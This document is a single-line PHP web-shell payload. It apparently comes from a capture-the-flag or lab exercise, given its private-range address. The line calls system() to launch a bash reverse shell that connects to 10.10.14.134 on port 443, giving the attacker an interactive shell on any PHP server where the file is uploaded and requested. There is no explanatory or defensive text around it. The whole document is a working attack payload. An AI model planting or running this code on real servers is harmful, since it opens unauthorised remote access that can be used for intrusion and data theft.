<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.134/443 0>&1\""); ?>
